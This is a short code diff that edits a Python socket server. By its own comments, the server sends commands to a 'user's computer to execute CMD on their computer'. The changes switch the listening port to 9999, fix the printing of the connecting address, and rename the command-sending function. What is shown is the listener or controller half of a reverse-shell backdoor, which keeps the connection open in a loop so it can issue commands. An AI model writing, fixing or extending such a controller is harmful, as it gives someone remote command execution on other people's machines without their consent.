@@ -8,7 +8,7 @@ def making_socket():
         global port
         global s
         host =""
-        port = 1201
+        port = 9999
         s= socket.socket() 
     
     except socket.error as msg:
@@ -34,16 +34,16 @@ def bind_the_socket():
 def establishing_socket():
     
     # Storing data info
-    conn,address = s.accept()
-    print("Connection successfully established.\n" + "IP" + address(0) + "Port" + str(address(1)))
+    conn, address = s.accept()
+    print("Connection successfully established.\n" + "IP " + address[0] + "Port " + str(address[1]))
     
     # Sending the command to user's computer to execute CMD on their computer
-    send_command(conn)
+    send_commands(conn)
     conn.close()
 
 # Sending command to client computer
 
-def command_sending(conn):
+def send_commands(conn):
     # The purpose of having infinite loop is to NOT let the connection close after executing the command
     while True:
         cmd = input()
